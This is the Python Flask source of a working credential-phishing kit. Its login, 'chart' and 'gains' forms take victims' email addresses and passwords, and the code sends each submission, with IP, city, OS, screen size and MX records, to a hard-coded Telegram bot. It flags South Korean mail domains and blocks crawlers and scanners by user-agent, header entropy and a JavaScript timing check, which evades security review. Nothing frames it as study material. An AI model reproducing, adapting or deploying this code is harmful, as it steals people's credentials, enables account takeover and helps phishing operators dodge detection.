from flask import Flask, render_template, request, session, abort, make_response, jsonify, redirect, url_for
import time, hashlib, secrets, requests, hmac, base64, re
import dns.resolver  # For MX records
import math
from collections import defaultdict
from flask import g

app = Flask(__name__)
click_counter = 0
DOMAIN_STATS = {}

# ----------------- CONFIG -----------------
app.secret_key = "supersecretkey123"

KR_TLDS = (".kr", ".co.kr", ".or.kr", ".go.kr", ".ac.kr", ".edu.kr", ".mil.kr", ".re.kr", ".pe.kr")

BOT_UA_KEYWORDS = [
    "bot","crawl","spider","scrapy","python","curl","wget",
    "selenium","playwright","puppeteer","headless"
]


RATE_LIMIT = defaultdict(list)

def is_suspicious_ua(ua: str):
    ua = ua.lower()
    return any(k in ua for k in BOT_UA_KEYWORDS)

def header_entropy(headers):
    s = "".join(headers.values())
    if not s:
        return 0
    probs = [s.count(c)/len(s) for c in set(s)]
    return -sum(p * math.log2(p) for p in probs)

def rate_limited(ip, limit=10, window=30):
    now = time.time()
    RATE_LIMIT[ip] = [t for t in RATE_LIMIT[ip] if now - t < window]
    RATE_LIMIT[ip].append(now)
    return len(RATE_LIMIT[ip]) > limit

def require_js_verified():
    return session.get("js_verified") is True
    

@app.route("/js-challenge")
def js_challenge():
    # Reuse existing token if set (allows refreshing without mismatch)
    if not session.get("js_challenge"):
        token = secrets.token_urlsafe(12)
        session["js_challenge"] = token
        session["js_start"] = time.time()
    else:
        token = session["js_challenge"]
    
    # Generate a dummy encoded_token for a placeholder email to pass variables to index.html
    dummy_email = "placeholder@example.com"
    encoded_token = encode_token(dummy_email)
    
    return render_template("js_challenge.html", token=token, encoded_token=encoded_token)

@app.route("/js-verify", methods=["POST"])
def js_verify():
    token = request.json.get("token")
    if token != session.get("js_challenge"):
        abort(403)

    elapsed = time.time() - session.get("js_start", 0)

    # Bots respond too fast
    if elapsed < 1.2:
        abort(403)

    session["js_verified"] = True
    return jsonify(ok=True)


@app.before_request
def advanced_anti_bot():
    ip = request.remote_addr or "UNKNOWN"
    ua = request.headers.get("User-Agent","")

    # 1. Hard block known bots
    if is_suspicious_ua(ua):
        abort(403)

    # 2. Header entropy (bots have low randomness)
    entropy = header_entropy(dict(request.headers))
    if entropy < 3.5:
        abort(403)

    # 3. Rate limit
    if rate_limited(ip):
        abort(429)

    # 4. Require JS verification
    if request.endpoint not in ("js_challenge","js_verify","screen_info","static"):
        if not require_js_verified():
            return redirect(url_for("js_challenge"))


KR_MX_PATTERNS = [
    "naver","daum","hanmail","kakao","dreamwiz","chol","empal","freechal",
    "hiworks","worksmobile","lineworks","line-works","mailnara","groupware","gwmail","bizsw","smartmail",
    "cafe24","mailcafe24","gabia","hostingkr","dothome","whois","nayana","blueweb","yeshosting","makeshop","imweb","sir",
    "ecount","douzone","younglimwon","bizbox","kt","skt","sktelecom","lguplus",
    "hanaro","boranet","thrunet","powercomm","go.kr","ac.kr","edu.kr","korea",
    "hanmir","nownuri","netian","orgio"
]

EMAIL_RE = re.compile(r"^[^@]+@[^@]+\.[^@]+$")

# Telegram
LOG_TELEGRAM = True
TELEGRAM_BOT_TOKEN = "8572183910:AAEWObtshtLr97B6JP85rXovBNQlwX730_M"
TELEGRAM_CHAT_ID = "1863969785"

# ----------------- HELPERS -----------------
def get_mx_hosts(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        return [r.exchange.to_text().rstrip('.') for r in answers] or [domain]
    except Exception:
        return [domain]

def is_korea_email(domain):
    d = domain.lower()
    if d.endswith(KR_TLDS):
        return True, "KR-TLD"
    for mx in get_mx_hosts(d):
        for pat in KR_MX_PATTERNS:
            if pat in mx.lower():
                return True, f"KR-MX:{pat}"
    return False, "NON-KR"

def parse_token(token: str):
    if not token or not EMAIL_RE.match(token):
        return None
    user, domain = token.split("@", 1)
    return {"email": token, "id": user, "domain": domain}

def encode_token(value: str):
    nonce = secrets.token_urlsafe(8)
    timestamp = str(int(time.time()))
    payload = f"{value}|{nonce}|{timestamp}"
    sig = hmac.new(app.secret_key.encode(), payload.encode(), hashlib.sha256).hexdigest()
    packed = f"{payload}|{sig}"
    return base64.urlsafe_b64encode(packed.encode()).decode()

def send_telegram(text):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=3)
    except Exception as e:
        print(f"Telegram error: {e}")

def get_os(user_agent: str):
    ua = user_agent.lower()
    if "windows" in ua: return "Windows"
    if "macintosh" in ua or "mac os" in ua: return "MacOS"
    if "linux" in ua: return "Linux"
    if "android" in ua: return "Android"
    if "iphone" in ua or "ipad" in ua: return "iOS"
    return "Unknown"

def get_geo(ip: str):
    try:
        if ip in ["127.0.0.1", "localhost", "UNKNOWN"]:
            return "Localhost", "Local"
        res = requests.get(f"http://ip-api.com/json/{ip}?fields=city,country", timeout=2)
        data = res.json()
        return data.get("city","Unknown"), data.get("country","Unknown")
    except Exception:
        return "Unknown", "Unknown"

def log_visit(token_data=None, form_data=None, route="home", screen_size=None):
    global click_counter, DOMAIN_STATS
    ip = request.remote_addr or "UNKNOWN"
    ua = request.headers.get("User-Agent", "N/A")
    click_counter += 1

    email = token_data.get("email") if token_data else "-"
    domain = token_data.get("domain").lower() if token_data else "-"

    DOMAIN_STATS.setdefault(domain, 0)
    DOMAIN_STATS[domain] += 1

    is_kr, kr_reason = is_korea_email(domain) if token_data else (False, "UNKNOWN")
    kr_flag = "🇰🇷 SOUTH KOREA" if is_kr else "🌍 GLOBAL"

    mx_hosts = get_mx_hosts(domain) if token_data else []
    mx_text = "\n".join([f"🖥️ {mx}" for mx in mx_hosts]) if mx_hosts else "-"

    os_name = get_os(ua)
    city, country = get_geo(ip)
    screen_text = screen_size if screen_size else "-"

    if LOG_TELEGRAM:
        msg = f"<b>📨 Route:</b> {route}\n\n"
        if token_data:
            msg += (
                f"✉️ <b>Email:</b> {email}\n"
                f"🌐 <b>Domain:</b> {domain}\n"
                f"🏳️ <b>Region:</b> {kr_flag}\n"
                f"🔍 <b>KR Detection:</b> {kr_reason}\n"
                f"🖥️ <b>MX Records:</b>\n{mx_text}\n"
            )
        if form_data:
            msg += f"🔑 <b>Password:</b> {form_data.get('password','-')}\n"

        msg += (
            f"💻 <b>OS:</b> {os_name}\n"
            f"🖥️ <b>Screen:</b> {screen_text}\n"
            f"📍 <b>IP:</b> {ip}\n"
            f"🏙️ <b>City:</b> {city}\n"
            f"🌎 <b>Country:</b> {country}\n"
            f"👆 <b>Total Clicks:</b> {click_counter}\n"
            f"📊 <b>Domain Clicks:</b> {DOMAIN_STATS.get(domain,0)}"
        )
        send_telegram(msg)

def handle_form_submission(email, password, route_name):
    if not email or not EMAIL_RE.match(email):
        abort(400, "Invalid email")

    token_data = parse_token(email)
    if not token_data:
        abort(400, "Invalid email")

    form_data = {"password": password}
    screen_size = session.get("screen_size")
    log_visit(token_data=token_data, form_data=form_data, route=route_name, screen_size=screen_size)

    token_enc = encode_token(email)

    profile = {
        "email": token_data["email"],
        "password": password,
        "id": token_data["id"],
        "domain": token_data["domain"],
        "token": session.get("js_token"),
        "encoded_token": token_enc,
        "mx": get_mx_hosts(token_data["domain"])
    }

    return profile, token_enc

# ----------------- ROUTES -----------------
@app.route("/")
def home():
    raw_token = request.args.get("token")
    encoded_token = request.args.get("token_enc")
    token_data = None

    if raw_token:
        token_data = parse_token(raw_token)
        if not token_data:
            abort(400)
        return redirect(url_for("home", token_enc=encode_token(raw_token)), code=302)

    if encoded_token:
        try:
            decoded = base64.urlsafe_b64decode(encoded_token).decode()
            email = decoded.split("|", 1)[0]
            token_data = parse_token(email)
        except Exception:
            token_data = None

    session["click_counter"] = session.get("click_counter", 0) + 1
    session["js_token"] = secrets.token_urlsafe(16)
    session["js_time"] = time.time()

    log_visit(token_data=token_data, route="home", screen_size=session.get("screen_size"))

    resp = make_response(render_template(
        "index.html",
        clicks=session["click_counter"],
        token=session["js_token"],
        encoded_token=encoded_token,
        token_data=token_data
    ))
    resp.headers["Cache-Control"] = "no-store"
    return resp

@app.route("/screen-info", methods=["POST"])
def screen_info():
    data = request.json or {}
    if data.get("width") and data.get("height"):
        session["screen_size"] = f"{data['width']}x{data['height']}"
    return jsonify(ok=True)

@app.route("/login", methods=["POST"])
def login():
    profile, token_enc = handle_form_submission(
        request.form.get("user_email", "").strip(),
        request.form.get("user_password", "").strip(),
        "login"
    )
    session["profile_data"] = profile
    return redirect(url_for("profile", token_enc=token_enc))

@app.route("/profile")
def profile():
    data = session.get("profile_data")
    if not data:
        return redirect(url_for("home"))
    return render_template("profile.html", **data)


@app.route("/chart", methods=["POST"])
def chart():
    email = request.form.get("user_email", "").strip()
    password = request.form.get("user_password", "").strip()
    profile, token_enc = handle_form_submission(email, password, "chart")
    session["file_data"] = profile
    return redirect(url_for("file", token_enc=token_enc))

@app.route("/file")
def file():
    token_enc = request.args.get("token_enc")
    data = session.get("file_data")
    if token_enc and data:
        try:
            decoded = base64.urlsafe_b64decode(token_enc).decode()
            email = decoded.split("|", 1)[0]
            data["token_data"] = parse_token(email)
        except Exception:
            pass
    if not data:
        return redirect(url_for("home"))
    return render_template("file.html", **data)


@app.route("/gains", methods=["POST"])
def gains():
    email = request.form.get("user_email", "").strip()
    password = request.form.get("user_password", "").strip()
    profile, token_enc = handle_form_submission(email, password, "gains")
    session["funds_data"] = profile
    return redirect(url_for("logout", token_enc=token_enc))

@app.route("/logout")
def logout():
    token_enc = request.args.get("token_enc")
    data = session.get("funds_data")
    if token_enc and data:
        try:
            decoded = base64.urlsafe_b64decode(token_enc).decode()
            email = decoded.split("|", 1)[0]
            data["token_data"] = parse_token(email)
        except Exception:
            pass
    if not data:
        return redirect(url_for("home"))
    return render_template("logout.html", **data)


# ----------------- RUN -----------------
if __name__ == "__main__":
    app.run(debug=True)



